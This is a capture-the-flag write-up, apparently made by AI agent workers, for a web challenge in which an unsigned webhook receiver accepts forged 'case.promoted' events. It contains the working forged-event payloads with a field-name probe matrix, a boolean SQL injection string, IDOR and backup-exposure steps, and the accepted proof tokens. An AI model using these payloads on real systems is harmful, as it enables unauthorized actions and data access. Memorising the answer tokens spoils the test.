---
day: 19
slug: "trust-the-webhook"
lane: web-exploitation
modes: [single_solve, time_trial, mastery]
has_solve_py: [time_trial, mastery]
tags: []  # TODO: fill in descriptive kebab-case bug-class/technique tags, e.g. [reflected-xss, idor]
---

## single_solve

I posted to the target’s feature route:

`POST https://6bd65bf6a773674ec179e39d8352fc46f1a559a82c68648d.2026.huntress.ctf.games/dispatch-3940be`

The successful request used only `Content-Type: application/json` and this body:

```json
{
  "event": "case.promoted",
  "type": "case.promoted",
  "event_type": "case.promoted",
  "owner_scope": "executive",
  "scope": "executive",
  "owner": "executive",
  "data": {
    "event": "case.promoted",
    "type": "case.promoted",
    "event_type": "case.promoted",
    "owner_scope": "executive",
    "scope": "executive"
  },
  "payload": {
    "event": "case.promoted",
    "type": "case.promoted",
    "event_type": "case.promoted",
    "owner_scope": "executive",
    "scope": "executive"
  }
}
```

The target responded:

```json
{"ok":true,"effect":"forged_event_consumed","evidence":"proof_2f58250f07c748998854d9f74c05af72"}
```

I got the route and values from the target’s `/api/clues` response: it named `/dispatch-3940be`, event type `case.promoted`, and owner scope `executive`. The homepage also pointed to the notes and described a protected effect. A GET to the feature route returned `post_required`, and an empty POST returned `webhook_rejected`, so I tried sending the clue values as a forged event. A few straightforward field layouts were rejected; the body above, which included common field names both at the top level and nested, was accepted.

One caveat: because I put several aliases and layouts into the successful request at once, I did **not** determine which individual field or nesting was necessary. I can say the target consumed that unsigned JSON request and returned the proof; I can’t claim that this was the minimal payload. I submitted the returned proof under `proof-1`, and the Game Master accepted it.

---

**Addendum (later worker, time_trial/mastery pass):** the minimal payload is
now known. The check is stateless — the same `proof_<hex>` comes back on
every correct repeat — so it was safe to binary-search the kitchen-sink body
directly against a live target. The receiver wants *exactly* two bare keys:

```json
{"event": "<event_type from /api/clues>", "owner": "<owner_scope from /api/clues>"}
```

Neither the clue's own key names (`event_type`/`owner_scope`) nor the
`type`/`scope` aliases work alone — only the literal words `event` and
`owner`, both required, both values matched exactly. No nesting under
`data`/`payload` is needed. See the `## time_trial and mastery` section
below for the full probe matrix and `docs/web-worker-lessons.md` for the
general lesson this produced.

## time_trial and mastery

This challenge's `time_trial` and `mastery` modes were solved later, in a
separate pass, and are not cleanly separable into two sections in the
original writeup below (the exploit narrative and most gotchas apply to
both; only "Mastery: 4 targets" is mastery-specific) — preserved as written,
verbatim, rather than forced apart:

# web-exploitation-day-19-trust-the-webhook (release day 26)

All three modes CORRECT: `single_solve`, `time_trial`, `mastery`.

Curriculum day 19 (release day 26) — ran as web worker slot 1, as a fresh
session continuing on from another agent's already-CORRECT `single_solve`
(that agent's notes: the `## single_solve` section above).
This NOTES.md covers `time_trial` and `mastery`, plus a narrowed-down,
minimal version of the bug class that agent found.

## New bug class: unsigned/forged webhook event trust

App "Trust the Webhook" (**Starlette**, Python). Prompt: *"The app believes
every event it's told about. Tell it a convincing enough story and watch it
act on your forged news."*

`GET /api/clues` discloses:

```json
{"framework":"Starlette","feature_route":"/dispatch-<hex>",
 "current_role":"analyst","event_type":"case.promoted","owner_scope":"executive"}
```

`feature_route` is a webhook receiver with **no signature/HMAC/auth check at
all** — a GET returns `post_required`; an empty POST returns
`webhook_rejected`. The receiver only checks that the POST body's event
type/scope match the disclosed `event_type`/`owner_scope` values; there is no
binding to `current_role` or any session/identity at all.

### The exploit — narrowed to the exact minimal payload

The previous agent's single_solve notes used a large body with every
plausible field name both flat and nested under `data`/`payload`, and
explicitly didn't know which part was load-bearing. I binary-searched the
field names/values directly against the live `time_trial` target (same proof
returned every time — the check is a stateless field match, not a one-shot
consumable event, so repeated probing is safe):

```
{"event_type":et,"owner_scope":os}                                   -> 403 webhook_rejected
{"event":et,"scope":os}                                               -> 403
{"type":et,"owner":os}                                                -> 403
{"event_type":et,"owner_scope":os,"type":et,"scope":os}               -> 403  (no "event" key)
{"type":et,"event_type":et,"owner_scope":os,"scope":os,"owner":os}    -> 403  (no "event" key)
{"event":et,"type":et,"event_type":et,"owner_scope":os,"scope":os,"owner":os} -> 200 forged_event_consumed
{"event":et,"owner":os}                                               -> 200 forged_event_consumed  <-- minimal
{"event":et}                                                          -> 403  (owner missing)
{"event":et,"scope":os}                                               -> 403  (wrong owner key name)
{"event":et,"owner_scope":os}                                         -> 403  (wrong owner key name)
{"event":et,"owner":"wrong value"}                                    -> 403  (value must match exactly)
{"event":"wrong.event","owner":os}                                    -> 403  (value must match exactly)
```

**The minimal, confirmed payload is exactly two bare keys**:
`POST feature_route {"event": event_type, "owner": owner_scope}` — the clue's
own key names (`event_type`/`owner_scope`) and the `type`/`scope` aliases do
**not** work; only the literal bare words `event` and `owner` do, both
required, both values matched exactly (no signature anywhere). Response:

```json
{"ok":true,"effect":"forged_event_consumed","evidence":"proof_<hex>"}
```

### Gotcha — malformed bodies can 500/crash the container

Per `docs/web-worker-lessons.md` (day 26 entry, added from this family): a
malformed/non-object POST body can trip the origin into a 500 and take the
whole attempt's container down. Only well-formed JSON objects were sent here;
no crash was observed on either target.

## Graded

- **single_solve**: CORRECT (prior agent) — `proof_2f58250f07c748998854d9f74c05af72`.
- **time_trial**: CORRECT — `proof_4e879e4dc64c48ddae9fd3047a8ad5c2`. Untimed
  (per pipeline policy; `wk.py` has no `run_for_time` path).
- **mastery**: CORRECT — 4 targets, 4 independently-classified bug classes,
  solved in one pass with no misclassification.

## Mastery: 4 targets, exactly the standing cumulative shape

Backup exposure + IDOR + day-19 group-closing SQLi + the family's own class
(see `docs/web-worker-lessons.md`). Each classified from its own live
evidence, join `questions[].artifact` -> `targets[].id`:

1. **Target 1 (proof-1)**, **backup exposure**. Root crawler-policy comment ->
   `/robots.txt` Disallow -> open directory index -> backup file ->
   `proof_8c113980325342a39cac0a75deb36a90`. Same as `recovery_lib.rec_backup`.
2. **Target 2 (proof-2)**, **IDOR**. Session dashboard links own case id(s);
   `/api/...` feed discloses a foreign case id; same-cookie-jar GET on that id
   -> `proof_212bb6d89dba4a88abe3d052a61d8816`. Same as `recovery_lib.rec_idor`.
3. **Target 3 (proof-3)**, **SQL injection (group-closing boolean)**. A
   `/explore|search|lookup`-style form over a quoted LIKE clause; day-19's
   verbatim `') OR ('1'='1` worked first try -> `proof_c588ea4ac93e4fbd87d9f07f95022413`.
   (Another independent confirmation of that exact payload.)
4. **Target 4 (proof-4)**, this family's own **forged webhook event**.
   `{"event": event_type, "owner": owner_scope}` to `feature_route` ->
   `proof_27edb29dda17432c89e64d2e686a6f78`.

All 4 recovered independently, submitted together -> CORRECT on first submit.

## Reusable solver

- `solve.py <base> [evidence_dir]` — this family's own class only: reads
  `/api/clues`, POSTs the minimal `{"event", "owner"}` body to `feature_route`
  (full-alias-superset fallback kept for robustness), extracts `proof_<hex>`.
  Fully derives route/event_type/owner_scope from the live target.
- `mastery.py <evidence_root> <base...>` — per-target classifier for mastery.
  Ports `rec_backup`, `rec_idor`, `rec_sqli_group_close` from
  `recovery_lib.py` (stdlib-only, scoped to one origin) and imports this
  day's own forged-webhook-event recoverer.

## Folded into the shared references (no coordination session was running,
## so this was done directly rather than left pending)

`rec_forged_webhook_event(t, clues)` is now in `recovery_lib.py`, wired into
`classify_and_recover`'s clue-driven dispatch chain right after the CSRF
check, guarded by `clues.get("feature_route") and clues.get("event_type") and
clues.get("owner_scope")` (confirmed non-overlapping with every other
feature_route-driven class's guard — this shape alone has no
`secondary_route`/`inventory_route`/`protected_reference`/`state_format_route`).
Logic:
1. `POST feature_route {"event": clues["event_type"], "owner": clues["owner_scope"]}`
   — exactly those two bare keys, no nesting, no signature.
2. Extract `proof_<hex>` from the response
   (`{"ok":true,"effect":"forged_event_consumed","evidence":"proof_..."}`).
3. Fallback: a maximal alias superset at the top level (every alias name at
   once) in case a future variant uses different bare key names.

Verified against a local HTTP fixture (not a live target - per the module's
own verification bar) both calling `rec_forged_webhook_event` directly and
through the full `classify_and_recover` dispatcher; also confirmed the new
dispatch guard has no overlap with the ssrf/field-action/graphql/
unsigned-state-role guards. `docs/web-worker-lessons.md` now carries the
table row (marked folded, not pending), the general methodology lesson ("A
working hit is not the same as knowing the mechanism"), and
`rec_forged_webhook_event` in the `recovery_lib.py` function list.

## Gotchas

- The clue's own key names (`event_type`, `owner_scope`) do **not** work as
  the POST body's field names — only the bare words `event`/`owner` do. Easy
  to over-think as "needs nesting/aliases" (the prior agent's working payload
  had 9 fields); it only ever needed 2.
- The webhook check is stateless (same proof on repeated correct POSTs) —
  safe to probe field-name/value variants directly against a live target
  without worrying about one-shot consumption.
- Malformed JSON bodies risk a 500/container crash per
  `docs/web-worker-lessons.md`; only well-formed objects were sent.
